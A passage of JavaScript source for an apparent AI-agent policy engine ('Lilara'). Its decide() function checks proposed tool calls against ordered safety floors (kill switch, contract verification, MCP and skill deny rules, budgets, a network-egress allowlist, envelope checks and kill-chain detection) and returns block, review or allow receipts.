#!/usr/bin/env node
"use strict";

const { score } = require("./risk-score");
const { append } = require("./decision-journal");
const { getApprovalCount, isLearnedAllowed, decisionKey, getSuggestionForInput, getPolicyFacts, hasAutoAllowOnce, consumeAutoAllowOnce, scopedKey } = require("./policy-store");
const { getSessionRisk, recordDecision, getSessionTrajectory } = require("./session-context");
const { loadProjectPolicy } = require("./project-policy");
const { discover } = require("./context-discovery");
const { fineKey } = require("./decision-key");
const { build } = require("./action-planner");
const { evaluate } = require("./promotion-guidance");
const { recommend } = require("./workflow-router");
const { classifyCommand, classifyCommandDual: _classifyCommandDualFromKey } = require("./decision-key"); // GATED_REVIEW_CLASSES moved to floor-mcp.js
const { normalizeCommand: _normalizeCommand }  = require("./command-normalize");
// ADR-020: bypass predicates moved to floor-mcp.js (F25/F26 helpers).
const { classifyIntent } = require("./intent-classifier");
const { getEntry, canDemote } = require("./decision-lattice"); // LATTICE_VERSION + getRungByName moved to early-receipt-builder.js
const { floorCodeFor } = require("./floor-codes");

// Lilara ADR-007 PR-C: floor labels are LATTICE-derived, not literals. Each
// constant below resolves to the canonical name/source for its floor; the
// engine reads these instead of hard-coded strings so a future relabel
// only has to touch decision-lattice.js. `_LF`/`_LS` capture the floor
// name (used as floorFired) and decisionSource respectively. For F4 where
// `source` is an array, the demoted variant lives at index 1.
const _F1  = getEntry("F1");          // kill-switch
const _F2  = getEntry("F2");          // contract-hash-mismatch
const _F5  = getEntry("F5");          // strict-gated-no-cover (harness-out-of-scope)
const _F11 = getEntry("F11");         // validity-window
const _F12 = getEntry("F12");         // mcp-deny
const _F13 = getEntry("F13");         // skill-deny
const _F14 = getEntry("F14");         // budget-exceeded
const _F3  = getEntry("F3");          // critical-risk
const _F8  = getEntry("F8");          // protected-branch
const _F4  = getEntry("F4");          // secret-class-C
const _F10 = getEntry("F10");         // taint-floor
const _F9  = getEntry("F9");          // session-risk-floor
const _F6  = getEntry("F6");          // posture-strict-no-cover
const _F7  = getEntry("F7");          // intent-unknown-strict
const _F14b = getEntry("F14b");       // session-over-duration
const _F18 = getEntry("F18");         // network-egress
const _F18D007 = getEntry("F18-D007");// plaintext-target-blocked (D-007 Lane 4)
const _F15 = getEntry("F15");         // execution-envelope
const _F16 = getEntry("F16");         // ambient-authority (ADR-009 PR-B)
const _F17 = getEntry("F17");         // cross-agent-lock (PR-A)
const _F19 = getEntry("F19");         // output-channel-exfiltration (ADR-010)
const _F20 = getEntry("F20");         // change-intent-drift (ADR-012)
const _F21 = getEntry("F21");         // compaction-survival (ADR-016)
const _F23 = getEntry("F23");         // data-flow-kill-chain (ADR-017)
const _F24 = getEntry("F24");         // credential-persistence-write
const _F25 = getEntry("F25");         // mcp-arg-danger
const _F26 = getEntry("F26");         // mcp-registration-write
const _CA  = getEntry("D-CONTRACT-ALLOW");  // contract-allow (sources[0/1])
const _LA  = getEntry("D-LEARNED-ALLOW");   // learned-allow
const _AAO = getEntry("D-AUTO-ALLOW-ONCE"); // auto-allow-once
const _TN  = getEntry("P-TRAJECTORY-NUDGE");// trajectory-nudge

// Demotion source identifiers used with canDemote(). Format mirrors the
// `demotableBy` strings in decision-lattice.js.
const _DEMOTE_F4_OPERATOR_TOKEN     = "operator-token:class-c-review-demote";
// ADR-010 F19: suspicious-severity output-channel matches demote via a one-shot
// scoped operator token. canDemote() reads `demotableBy` from the LATTICE entry,
// and the engine separately consumes the token via consumeScopedOperatorToken
// against `output-exfil-review-demote` (the scope used on `mintOperatorToken`).
const _DEMOTE_F19_SUSPICIOUS        = "operator-token-suspicious-only";
const _DEMOTE_F19_TOKEN_SCOPE       = "output-exfil-review-demote";
// ADR-012 F20: medium-severity change-intent drift may be demoted via a
// one-shot scoped operator token bound to `change-intent-drift-medium`.
// `high` is non-demotable; `low` is receipt-only (no demotion required).
const _DEMOTE_F20_MEDIUM            = "operator-token-medium-only";
const _DEMOTE_F20_TOKEN_SCOPE       = "change-intent-drift-medium";
const _DEMOTE_F9_TOOL_ALLOW_MATCHED = "contract-allow:tool-allow-matched";
const _DEMOTE_F9_TOOL_ALLOW_SCOPE   = "contract-allow:tool-allow-tool-scope";

// _irJournalExtras — moved to runtime/early-receipt-builder.js (irJournalExtras).

// Taint-floor disablement: warn once per process if taint module unavailable.
let _taintWarnedOnce = false;

// Hoisted contract helpers - resolved once at module init so the decide() hot
// path doesn't pay per-call require() lookups (10x per decide pre-hoist on
// no-contract installs, dominant on macOS where cold requires are slow).
const _contractMod = require("./contract");
const {
  GATED_CLASSES: GATED_COMMAND_CLASSES,
  load: _contractLoad,
  verify: _contractVerify,
  getContextTrust: _contractGetContextTrust,
  scopeMatch: _contractScopeMatch,
  isInActiveWindow: _contractIsInActiveWindow,
  getMcpPolicy: _contractGetMcpPolicy,
  extractMcpServerName: _contractExtractMcpServerName,
  getSkillPolicy: _contractGetSkillPolicy,
  getSessionConstraints: _contractGetSessionConstraints,
  getBudgetLimits: _contractGetBudgetLimits,
  getNetworkPolicy: _contractGetNetworkPolicy,
  consumeScopedOperatorToken: _contractConsumeScopedOperatorToken,
} = _contractMod;
const {
  evaluate: _evalNet,
  evaluateDns: _evalNetDns,
  evaluateIpSet: _evalNetIpSet,
  evaluateTargets: _evalNetTargets,
  irTargetsToEgressTargets: _irToEgressTargets,
} = require("./network-egress");
const { classifyDeployTarget: _classifyDeployTarget } = require("./action-ir");
// (PERSISTENCE_PATTERNS moved to runtime/floor-credential-persist.js)
// (globMatch moved to floor-credential-persist.js, floor-ambient-authority.js, floor-mcp.js)
// (classifyAmbientPath moved to floor-ambient-authority.js and floor-mcp.js)
// F17 PR-A: cross-agent-lock helpers — extracted to runtime/floor-cross-agent-lock-eval.js.
const { evalCrossAgentLockFloor: _evalCrossAgentLockFloor } = require("./floor-cross-agent-lock-eval");
const { checkArgShapeDrift: _checkArgShapeDrift } = require("./mcp-pin");
// ADR-004 PR 37B: degraded-mode descriptor + write-like classifier. The
// descriptor is computed once per process from journal-chain.verify(); when
// degraded, F4 operator-token demotion is suppressed and write-like `allow`
// is routed to `require-review`. Every receipt + journal entry carries a
// `degradedMode` marker so audit can distinguish degraded receipts.
const _degradedMode = require("./degraded-mode");
// ADR-013: auto-snapshot before destructive-allow. Side-effect rail only —
// snapshot creation NEVER changes a decision; failures fail open. The
// receipt key is additive (only present on destructive-allow decisions).
const _snapshot = require("./snapshot");
// ADR-015 (PR-η): notification hook — extracted to runtime/notify-engine-hook.js.
const { fireNotifyHook: _fireNotifyHook } = require("./notify-engine-hook");
// Optional modules - fixtures rename these to *.disabled-test-bak to verify
// fail-open fallback, so the require itself must be guarded. Each cached as
// null when absent and call sites check before use.
let _scanSecrets = null;
try { _scanSecrets = require("./secret-scan").scanSecrets; } catch { /* optional */ }
let _correlateCommand = null;
try { _correlateCommand = require("./taint").correlateCommand; } catch { /* optional */ }
// ADR-017 F23: provenance-graph + session-context graph storage. Guarded the
// same way as other optional modules so a broken module fails open — F23 will
// simply not fire. The graph helpers are pure; I/O lives in session-context.
let _provenanceGraph = null;
let _loadProvenanceGraph = null, _recordProvenanceStep = null;
try {
  _provenanceGraph = require("./provenance-graph");
  const _sc = require("./session-context");
  _loadProvenanceGraph  = _sc.loadProvenanceGraph;
  _recordProvenanceStep = _sc.recordProvenanceStep;
} catch { /* optional — F23 fails open */ }
let _getCounters = null, _recordDestructiveOp = null;
try {
  const sb = require("./session-budget");
  _getCounters = sb.getCounters;
  _recordDestructiveOp = sb.recordDestructiveOp;
} catch { /* optional */ }
// ADR-031: input materialization — getter-free, null-safe copy at decide() entry.
const { materializeInput: _materializeInput } = require("./input-materializer");

// Contract is loaded lazily - disabled only when LILARA_CONTRACT_ENABLED=0.
// `_contractLoaded` distinguishes "not yet loaded" from "loaded as null" so a
// missing contract file doesn't re-trigger fs.existsSync on every decide().
let _contract = null;
let _contractLoaded = false;
function getContract(projectRoot) {
  if (process.env.LILARA_CONTRACT_ENABLED === "0") return null;
  if (_contractLoaded) return _contract;
  try {
    _contract = _contractLoad(projectRoot || process.cwd());
  } catch { _contract = null; }
  _contractLoaded = true;
  return _contract;
}

// ---------------------------------------------------------------------------
// Early-block receipt builders + shared state — extracted to
// runtime/early-receipt-builder.js. decide() sets per-call state via the
// exported setters before evaluating any floor.
// ---------------------------------------------------------------------------
const {
  harnessInScope,
  buildEarlyBlock,
  buildEarlyReview,
  irJournalExtras: _irJournalExtras,
  setEarlyBlockDegradedDefault,
  setEarlyBlockContract,
  setEarlyBlockDryRun,
  setEarlyBlockF23,
} = require("./early-receipt-builder");

// F16 (ADR-009 PR-B): ambient-authority floor helpers — extracted to runtime/floor-ambient-authority.js.
const {
  evalAmbientFloor: _evalAmbientFloor,
  classifyAmbientTouch: _classifyAmbientTouch,
} = require("./floor-ambient-authority");

// F24: credential-persistence-write floor helpers — extracted to runtime/floor-credential-persist.js.
const { evalCredPersistFloor: _evalCredPersistFloor } = require("./floor-credential-persist");

// F25 + F26: MCP floor helpers — extracted to runtime/floor-mcp.js.
// _classifyCommandDual alias kept for decide()'s cmdClass computation at line ~984.
const _classifyCommandDual = _classifyCommandDualFromKey;
const {
  evalMcpArgFloor: _evalMcpArgFloor,
  evalMcpRegistrationFloor: _evalMcpRegistrationFloor,
} = require("./floor-mcp");

// F19 (ADR-010) — output-channel-exfiltration floor. Classifier + floor
// evaluator both live in runtime/output-exfil.js; the engine only consumes
// the `{ fire, severity, channel, … }` result and decides routing.
const { evaluateFloor: _evalF19Floor } = require("./output-exfil");

// F20 (ADR-012) — change-intent drift evaluator. Pure helper; declared-intent
// envelope read-side lives in runtime/envelope.js (loadDeclaredEnvelope).
const { diffEnvelopeVsIr: _diffChangeIntent } = require("./change-intent");
const { loadDeclaredEnvelope: _loadDeclaredEnvelope } = require("./envelope");

// F17: cross-agent-lock floor helpers — extracted to runtime/floor-cross-agent-lock-eval.js.

// _classifyNotifyEvent + _fireNotifyHook — extracted to runtime/notify-engine-hook.js.
// (_fireNotifyHook aliased via the require at the top of this section)

function decide(input = {}) {
  if (process.env.LILARA_KILL_SWITCH === "1") {
    const killResult = {
      action: "block",
      enforcementAction: "block",
      floorFired: _F1.name,
      riskScore: 10,
      riskLevel: "critical",
      reasonCodes: [_F1.name],
      confidence: 1,
      decisionSource: _F1.source,
      policyKey: _F1.name,
      explanation: "kill-switch engaged — all decisions blocked",
      pendingSuggestion: null,
      promotionGuidance: null,
      promotionState: null,
      promotionLifecycleSummary: null,
      workflowRoute: null,
      actionPlan: null,
      trajectoryNudge: null,
      context: {},
    };
    // ADR-015: even a kill-switched return can notify if a contract is
    // present and enables notifications. Best-effort contract load so a
    // bad/missing contract doesn't change kill-switch behaviour.
    try { _fireNotifyHook(killResult, getContract(process.cwd()), killResult.policyKey); } catch { /* */ }
    return killResult;
  }

  // ADR-031 — Input materialization.  Produce a plain, getter-free, null-safe
  // copy of `input` so every downstream read — discover(), Object.entries(),
  // the floor helpers, and the receipt builders (which receive `input` as a
  // parameter) — sees a safe value.  Closes trust-boundary-map A1–A9 in one
  // seam without touching floor internals or the classifier (ADR-031 §Design).
  //
  // Fail-CLOSED: if materializeInput itself throws (it is designed never to, but
  // defence-in-depth), decide() returns a require-review receipt rather than
  // propagating the throw to pretool-gate.js:281-282 (the fail-OPEN branch).
  // Module-scope state (_earlyBlockContract, _earlyBlockDegradedDefault) has not
  // been set yet at this point, so the fallback receipt is built inline with safe
  // zero values — still a valid enforceable decision object.
  {
    let _matErr = false;
    try { input = _materializeInput(input); } catch { _matErr = true; }
    if (_matErr) {
      return {
        action: "require-review",
        enforcementAction: "require-review",
        floorFired: "input-materialization-failed",
        riskScore: 5,
        riskLevel: "medium",
        reasonCodes: ["input-materialization-failed"],
        confidence: 0.5,
        decisionSource: "contract-floor",
        policyKey: "input-materialization-failed",
        explanation: "decide() input materialization failed — failing safe to require-review",
        pendingSuggestion: null,
        promotionGuidance: null,
        promotionState: null,
        promotionLifecycleSummary: null,
        workflowRoute: null,
        actionPlan: null,
        trajectoryNudge: null,
        envelope: null,
        envelopeVerification: null,
        networkEgress: null,
        context: {},
      };
    }
  }

  const discovered = discover(input);
  const explicit = Object.fromEntries(
    Object.entries(input).filter(([, value]) => value !== "" && value != null)
  );
  const projectPolicy = loadProjectPolicy({ ...discovered, ...explicit });
  const mergedMarkers = [...new Set([
    ...(Array.isArray(projectPolicy.projectMarkers) ? projectPolicy.projectMarkers : []),
    ...(Array.isArray(discovered.projectMarkers) ? discovered.projectMarkers : []),
  ].filter(Boolean))];
  const enriched = {
    ...projectPolicy,
    ...discovered,
    ...explicit,
    projectMarkers: mergedMarkers,
    primaryStack: explicit.primaryStack || projectPolicy.primaryStack || discovered.primaryStack || null,
    repeatedApprovals: input.repeatedApprovals != null ? input.repeatedApprovals : getApprovalCount({ ...projectPolicy, ...discovered, ...explicit }),
    sessionRisk: input.sessionRisk != null ? input.sessionRisk : getSessionRisk(),
    branchExplicit: input.branch != null && input.branch !== "",
  };

  // ADR-009 PR-C: classify ambient-touch ONCE per decide(); threaded into
  // every receipt-emitting branch via `extra.ambientTouch` (early-block path)
  // and via the final result/journal spreads (non-block path).
  // ADR-025: guarded so an adversarial input property cannot crash decide()
  // before the security floors run. Advisory receipt enrichment only — fail-safe
  // to the no-touch shape { class: null, path: null }.
  let _ambientTouch;
  try { _ambientTouch = _classifyAmbientTouch(input); }
  catch { _ambientTouch = { class: null, path: null }; }

  // ADR-004 PR 37B: degraded-mode descriptor. Memoised in the helper module
  // for the process lifetime; tests reset via `_clearCache()`. Threaded into
  // every receipt-emitting site via `_degradedMarker` so both the early-block
  // path and the final return surface the same marker.
  const _degradedState  = _degradedMode.getCached();
  const _degradedMarker = _degradedMode.buildMarker(_degradedState);
  // ADR-030: guarded so an adversarial input property cannot crash decide()
  // before the security floors run. isWriteLike reads input.tool/ir/envelope/command;
  // on throw, fail-safe to true ("assume write-like") so degraded-mode routing
  // still escalates rather than silently allowing. Advisory only — the floors decide.
  let _writeLike;
  try { _writeLike = _degradedMode.isWriteLike(input); }
  catch { _writeLike = true; }
  // Default for buildEarlyBlock() — set per-call so the early-block path
  // (kill-switch is the one exception above; it returns before this point)
  // sees the same marker as the final return.
  setEarlyBlockDegradedDefault(_degradedMarker);

  // Classify command intent for routing intelligence and journaling.
  // ADR-030: guarded so an adversarial input.command getter cannot crash decide()
  // before the security floors run. Advisory receipt/routing enrichment only —
  // fail-safe to the no-touch shape { intent:"unknown", confidence:0.3, indicators:[] }
  // (mirrors classifyIntent's own empty-input return at intent-classifier.js:37).
  // Note: classifyCommandDual at line ~1057 also reads input.command but is load-bearing
  // (drives isGated / F2 / contract scope class) and must not be silently swallowed
  // — see ADR-031 for the input-materialization fix for load-bearing sites.
  let intentResult;
  try { intentResult = classifyIntent(input.command || ""); }
  catch { intentResult = { intent: "unknown", confidence: 0.3, indicators: [] }; }

  // ── Section 4.6 precedence matrix: contract verification (Steps 2 + 5) ──
  const contract    = getContract(discovered.projectRoot || process.cwd());
  // ADR-015: thread the active contract to the early-block return path so
  // kill-switch / contract-mismatch fires can still emit a notification.
  setEarlyBlockContract(contract);
  // ADR-016: thread dryRun to early-block paths so sandbox previews skip journal.
  // Captured locally so decide()'s own journal/recordDecision gates use the same value.
  const _dryRun = Boolean(input.dryRun || process.env.LILARA_DRY_RUN === "1");
  setEarlyBlockDryRun(_dryRun);
  // ADR-017 F23: reset per-call so the early-block path doesn't carry a stale receipt.
  setEarlyBlockF23(null);

  // B2 commit 2: contextTrust per-branch posture override.
  // Replaces enriched.trustPosture for risk scoring only — does not affect scopes or floors.
  if (contract && enriched.branch) {
    try {
      const overridePosture = _contractGetContextTrust(contract, enriched.branch);
      if (overridePosture) {
        enriched.trustPosture = overridePosture;
      }
    } catch { /* override is best-effort; fall back to project policy */ }
  }

  // ADR-023: use classifyCommandDual so Cyrillic/ZWJ/confusable evasions are
  // caught when computing contract scope class for non-MCP Bash commands.
  const cmdClass    = _classifyCommandDual(input.command || "");
  const isGated     = GATED_COMMAND_CLASSES.has(cmdClass);
  let contractAllow = false;
  let contractReason = null;
  let contractId    = contract?.contractId || null;

  if (contract) {
    // Step 2: contract-hash-mismatch in strict mode — block
    if (process.env.LILARA_CONTRACT_REQUIRED === "1") {
      try {
        const vResult = _contractVerify(discovered.projectRoot || process.cwd());
        if (!vResult.ok) {
          return buildEarlyBlock(
            "contract-hash-mismatch", enriched, discovered, input,
            `contract hash mismatch (${vResult.reason}) — failing closed`,
            { floorFired: _F2.name, decisionSource: _F2.source, ambientTouch: _ambientTouch }
          );
        }
      } catch (verifyErr) {
        // verify threw — fail closed in strict mode
        return buildEarlyBlock(
          "contract-hash-mismatch", enriched, discovered, input,
          `contract verify error (${verifyErr instanceof Error ? verifyErr.message : "unknown"}) — failing closed`,
          { floorFired: _F2.name, decisionSource: _F2.source, ambientTouch: _ambientTouch }
        );
      }
    }

    // Step 5: strict-mode + gated class + no contract coverage → block
    const harness = String(input.harness || enriched.harness || "");
    if (process.env.LILARA_CONTRACT_REQUIRED === "1" && harness && !harnessInScope(contract, harness)) {
      if (isGated) {
        return buildEarlyBlock("harness-out-of-scope", enriched, discovered, input,
          `harness '${harness}' not in contract harnessScope — run: lilara-cli contract amend --add-harness ${harness}`,
          { floorFired: _F5.name, decisionSource: _F5.source, ambientTouch: _ambientTouch });
      }
    }

    // Step 11: contract scope-allow — may demote baseline (but never demotes floors)
    try {
      const sm = _contractScopeMatch(contract, {
        command: input.command, commandClass: cmdClass,
        targetPath: input.targetPath, branch: enriched.branch,
        payloadClass: enriched.payloadClass || "A",
        harness: input.harness, projectRoot: discovered.projectRoot,
      });
      if (sm.allowed) {
        contractAllow = true;
        contractReason = sm.reason;
      }
    } catch { /* scopeMatch error → contractAllow stays false */ }
  } else if (process.env.LILARA_CONTRACT_REQUIRED === "1" && isGated) {
    // No contract + strict mode + gated class → block
    return buildEarlyBlock("no-contract-strict", enriched, discovered, input,
      "no accepted contract — run: lilara-cli contract init && lilara-cli contract accept",
      { ambientTouch: _ambientTouch });
  }

  // F11: validity-window floor — contract-defined active hours/days.
  // Fires after scopeMatch capture so contractAllow has a chance to set,
  // and before risk classification so the floor can short-circuit.
  let validityResult = { inWindow: true, reason: "no-validity-block" };
  let validityWarning = null;
  if (contract) {
    try {
      validityResult = _contractIsInActiveWindow(contract);
    } catch { /* helper unavailable → treat as in-window (fail-open per zero-dep policy) */ }

    if (!validityResult.inWindow) {
      const payloadClass = String(input.payloadClass || enriched.payloadClass || "A").toUpperCase();
      const pcAction     = contract?.scopes?.payloadClasses?.[payloadClass] || "allow";
      if (pcAction === "warn" || pcAction === "block") {
        return buildEarlyBlock(
          "validity-window", enriched, discovered, input,
          `contract validity inactive (${validityResult.reason}); payloadClass=${payloadClass} action=${pcAction} — failing closed`,
          { floorFired: _F11.name, decisionSource: _F11.source, ambientTouch: _ambientTouch }
        );
      }
      // Non-gated payload class outside-window → annotate, action unchanged.
      validityWarning = { code: "outside-window", reason: validityResult.reason };
    }
  }

  // F12: mcp-deny floor — per-MCP-server policy (scopes.mcp).
  let mcpWarning = null;
  try {
    const serverName = input.mcpServer || _contractExtractMcpServerName(input.tool);
    if (serverName && contract) {
      const policy = _contractGetMcpPolicy(contract, serverName);
      if (policy === "block") {
        return buildEarlyBlock("mcp-deny", enriched, discovered, input,
          `MCP server '${serverName}' denied by contract scopes.mcp`,
          { floorFired: _F12.name, decisionSource: _F12.source, ambientTouch: _ambientTouch });
      }
      if (policy === "warn") {
        mcpWarning = { code: "policy-warn", name: serverName, policy: "warn" };
      }
    }
  } catch { /* helper unavailable → no-op */ }

  // F13: skill-deny floor — per-skill policy (scopes.skills).
  let skillWarning = null;
  try {
    const skillName = input.skillName;
    if (skillName && contract) {
      const policy = _contractGetSkillPolicy(contract, skillName);
      if (policy === "block") {
        return buildEarlyBlock("skill-deny", enriched, discovered, input,
          `Skill '${skillName}' denied by contract scopes.skills`,
          { floorFired: _F13.name, decisionSource: _F13.source, ambientTouch: _ambientTouch });
      }
      if (policy === "warn") {
        skillWarning = { code: "policy-warn", name: skillName, policy: "warn" };
      }
    }
  } catch { /* helper unavailable → no-op */ }

  // F14: budget-exceeded hard floor + session-duration require-review escalation (D47).
  let sessionDurationWarning = null;
  let sessionOverDuration    = false;
  try {
    const sessionId = enriched.sessionId || discovered.sessionId;

    const sessionCfg = _contractGetSessionConstraints(contract);
    const budgetCfg  = _contractGetBudgetLimits(contract);

    if (sessionId && (sessionCfg || budgetCfg) && _getCounters) {
      const counters = _getCounters({ sessionId });

      if (sessionCfg && Number.isFinite(sessionCfg.maxDurationMin)) {
        const ageMin = (Date.now() - counters.startTime) / 60000;
        if (ageMin > sessionCfg.maxDurationMin) {
          sessionDurationWarning = {
            code: "session-over-duration",
            ageMin: Math.round(ageMin),
            limitMin: sessionCfg.maxDurationMin,
          };
          sessionOverDuration = true;
        }
      }

      if (budgetCfg) {
        if (Number.isFinite(budgetCfg.maxDestructiveOps) &&
            counters.destructiveOps >= budgetCfg.maxDestructiveOps) {
          return buildEarlyBlock("budget-exceeded", enriched, discovered, input,
            `destructive-ops budget exceeded: ${counters.destructiveOps}/${budgetCfg.maxDestructiveOps}`,
            { floorFired: _F14.name, decisionSource: _F14.source, ambientTouch: _ambientTouch });
        }
        if (Number.isFinite(budgetCfg.maxExternalBytes) &&
            counters.externalBytes >= budgetCfg.maxExternalBytes) {
          return buildEarlyBlock("budget-exceeded", enriched, discovered, input,
            `external-bytes budget exceeded: ${counters.externalBytes}/${budgetCfg.maxExternalBytes}`,
            { floorFired: _F14.name, decisionSource: _F14.source, ambientTouch: _ambientTouch });
        }
      }
    }
  } catch { /* helper unavailable → no-op */ }

  // F18: network-egress floor (ADR-005) — per-contract domain allowlist for
  // outbound network calls. Default-deny: empty allowDomains blocks all network.
  // Additive opt-in: only enforces when the contract carries a
  // `scopes.network.allowDomains` array. Existing v1/v2/v3 contracts without
  // the field continue to operate exactly as before.
  if (contract) {
    try {
      const netPolicy = _contractGetNetworkPolicy(contract);
      const hasF18Signal = netPolicy && (
        Array.isArray(netPolicy.allowDomains) ||
        Array.isArray(netPolicy.denyDomains) ||
        typeof netPolicy.allowPlaintext === "boolean"
      );
      if (hasF18Signal) {
        // Primary target extraction: command string. If empty (e.g. native
        // WebFetch with URL in tool_input rather than command), fall back to
        // IR networkTargets so WebFetch calls are covered without a policy gap.
        const cmdStr = input.command || "";
        let ne = _evalNet(cmdStr, netPolicy);
        if (!ne.fired && ne.reason === "no-network-target" &&
            input.ir && Array.isArray(input.ir.networkTargets) && input.ir.networkTargets.length > 0) {
          ne = _evalNetTargets(_irToEgressTargets(input.ir.networkTargets), netPolicy);
        }
        if (ne.fired) {
          if (ne.reason === "plaintext-target-blocked") {
            return buildEarlyBlock(
              "plaintext-target-blocked",
              enriched,
              discovered,
              input,
              `network egress blocked: plaintext http:// target '${ne.host}' (set scopes.network.allowPlaintext=true to permit) (target=${ne.target})`,
              { floorFired: _F18D007.name, decisionSource: _F18D007.source, ambientTouch: _ambientTouch }
            );
          }
          const detail =
            ne.reason === "ip-literal-blocked"
              ? `IP-literal host '${ne.host}' blocked (use allowDomains hostnames; loopback exempt)`
              : ne.reason === "deny-domain-match"
                ? `host '${ne.host}' matched denyDomains`
                : `host '${ne.host}' not in network.allowDomains`;
          return buildEarlyBlock(
            "network-egress-denied",
            enriched,
            discovered,
            input,
            `network egress blocked: ${detail} (target=${ne.target})`,
            { floorFired: _F18.name, decisionSource: _F18.source, ambientTouch: _ambientTouch }
          );
        }

        // ADR-005 FC #4: DNS-failure path. When the caller pre-resolved DNS
        // and the lookup failed for an allow-matched host, F18 fires unless
        // the per-entry `allowOnLookupFailure` flag is true. Dormant when
        // input.dnsResolutions is absent (callers may skip resolution).
        if (input.dnsResolutions && typeof input.dnsResolutions === "object") {
          const dnsCheck = _evalNetDns(cmdStr, netPolicy, input.dnsResolutions);
          if (dnsCheck.fired) {
            return buildEarlyBlock(
              "network-egress-denied",
              enriched,
              discovered,
              input,
              `network egress blocked: DNS lookup failed for '${dnsCheck.host}' (resolver=${dnsCheck.resolverCode}) (target=${dnsCheck.target})`,
              {
                floorFired: _F18.name,
                decisionSource: _F18.source,
                ambientTouch: _ambientTouch,
                networkEgress: {
                  failureReason: "dns_lookup_failed",
                  hostname: dnsCheck.host,
                  resolverCode: dnsCheck.resolverCode,
                  target: dnsCheck.target,
                },
              }
            );
          }
        }

        // ADR-005 FC #5: envelope-bound IP recheck at exec-time. The
        // PreToolUse envelope carries the resolved-IP set; the harness
        // adapter reports the actual connected IP(s) via
        // input.observedConnectedIps. Fires if observed IP is not in the set.
        // O(1) Set membership — no DNS re-resolve here.
        if (
          input.envelope &&
          Array.isArray(input.envelope.networkTargets) &&
          Array.isArray(input.observedConnectedIps) &&
          input.observedConnectedIps.length > 0
        ) {
          const ipCheck = _evalNetIpSet(input.envelope.networkTargets, input.observedConnectedIps);
          if (ipCheck.fired) {
            return buildEarlyBlock(
              "network-egress-denied",
              enriched,
              discovered,
              input,
              `network egress blocked: exec-time IP ${ipCheck.observedIp} for host '${ipCheck.host}' not in envelope-bound set [${(ipCheck.envelopeBoundIps || []).join(",")}]`,
              {
                floorFired: _F18.name,
                decisionSource: _F18.source,
                ambientTouch: _ambientTouch,
                networkEgress: {
                  failureReason: "ip_set_mismatch",
                  hostname: ipCheck.host,
                  observedIp: ipCheck.observedIp,
                  envelopeBoundIps: ipCheck.envelopeBoundIps || [],
                },
              }
            );
          }
        }
      }
    } catch { /* network-egress unavailable → no-op (fail-open per zero-dep policy) */ }
  }

  // F15: execution-envelope divergence floor — fail closed when the adapter's
  // observed execution envelope differs from the decision envelope.
  let envelopeVerification = null;
  if (input.envelope && input.observedEnvelope) {
    try {
      const { verify } = require("./envelope");
      envelopeVerification = verify(input.envelope, input.observedEnvelope, {
        enforceEnvDiff: input.enforceEnvDiff !== false,
      });
      if (!envelopeVerification.ok) {
        return buildEarlyBlock(
          "execution-envelope-diverged",
          enriched,
          discovered,
          input,
          `execution envelope diverged (${envelopeVerification.reason}) — failing closed`,
          {
            floorFired: _F15.name,
            decisionSource: _F15.source,
            ambientTouch: _ambientTouch,
            envelopeVerification,
          }
        );
      }
    } catch (verifyErr) {
      return buildEarlyBlock(
        "execution-envelope-diverged",
        enriched,
        discovered,
        input,
        `execution envelope verify error (${verifyErr instanceof Error ? verifyErr.message : "unknown"}) — failing closed`,
        {
          floorFired: _F15.name,
          decisionSource: _F15.source,
          ambientTouch: _ambientTouch,
        }
      );
    }
  }

  // F23 (ADR-017): cross-call data-flow / kill-chain detection — rung 18.6.
  //
  // Evaluation is placed HERE (before F16/F17) so that kill-chain context
  // is available in buildEarlyBlock receipts when ambient-authority or
  // cross-agent-lock floors fire first. The detected chain is surfaced via
  // _earlyBlockF23 (module-level, cleared per decide() call) so buildEarlyBlock
  // can include it without requiring a parameter change at every call site.
  //
  // Observe mode (default): adds only the killChain receipt field — action /
  // source / floorFired are UNCHANGED. Enforce mode (LILARA_KILL_CHAIN_ENFORCE=1)
  // applies block (exfil) or escalate (exec / persistence) via the late-override
  // block near line 1489, after F20.
  //
  // Side-effect: for write/edit IR calls, records a "derivative" node in the
  // provenance graph when write content overlaps a known source. Determinism-safe:
  // single-command replay uses a fresh isolated stateDir (cleaned after).
  let _f23Detail = null;
  let _f23PreviewAction = null; // only set in enforce mode when chain fires
  try {
    if (_provenanceGraph && _loadProvenanceGraph) {
      const _f23Graph = _loadProvenanceGraph();
      const _ir23 = input && input.ir;

      if (_ir23) {
        // Extract write content for propagation + persistence detection
        const _writeContent = String(
          (input.tool_input && (input.tool_input.content || input.tool_input.new_string || "")) ||
          (typeof input.content === "string" ? input.content : "") ||
          (typeof input.new_string === "string" ? input.new_string : "")
        );
        const _writeTokens = _writeContent.length >= 20
          ? _provenanceGraph.tokenHashSet(_writeContent)
          : [];

        // Evaluate whether pending call closes a kill chain
        const _f23Eval = _provenanceGraph.evaluate(_ir23, _f23Graph, {
          writeContentTokenHashes: _writeTokens,
        });

        if (_f23Eval.detected) {
          const _enforce = process.env.LILARA_KILL_CHAIN_ENFORCE === "1";
          _f23Detail = {
            chainType:   _f23Eval.chainType,
            severity:    _f23Eval.severity,
            detected:    true,
            enforced:    _enforce,
            wouldAction: _f23Eval.wouldAction,
            confidence:  _f23Eval.confidence,
            evidence:    Array.isArray(_f23Eval.evidence) ? _f23Eval.evidence : [],
            steps:       Array.isArray(_f23Eval.steps)    ? _f23Eval.steps    : [],
          };
          setEarlyBlockF23(_f23Detail); // thread to buildEarlyBlock for F16/F17/etc.
          if (_enforce) {
            _f23PreviewAction = _f23Eval.wouldAction; // "block" or "escalate"
          }
        }

        // Propagation recording: if writing tainted data, mark target as derivative.
        // Gated on interesting IR (file-write with content, non-empty graph).
        if (_ir23.toolKind === "file-write" && _writeTokens.length >= 3 &&
            _f23Graph.length > 0 && _recordProvenanceStep) {
          const _srcNode = _provenanceGraph.findPropagationSource(_writeTokens, _f23Graph);
          if (_srcNode) {
            for (const ft of (_ir23.fileTargets || [])) {
              if (ft && ft.intent === "write" && ft.path) {
                try {
                  _recordProvenanceStep({
                    role:           "derivative",
                    sourceClass:    _srcNode.sourceClass,
                    targetPathHash: _provenanceGraph.pathHash(ft.path),
                    tokenHashes:    _writeTokens.slice(0, 32),
                    ts:             Date.now(),
                  });
                } catch { /* best-effort */ }
              }
            }
          }
        }
      }
    }
  } catch { /* F23 must never throw out — fail open */ }

  // F16 (ADR-009 PR-B): ambient-authority floor — rung 17.5, after F15 (envelope)
  // and before the contract-allow demotion path. Non-demotable; the only legitimate
  // bypass is a matching `scopes.ambient.allow[]` entry.
  // ADR-025: fail-safe on unexpected throw — route to require-review so ambient
  // writes are not silently permitted when the evaluator cannot complete.
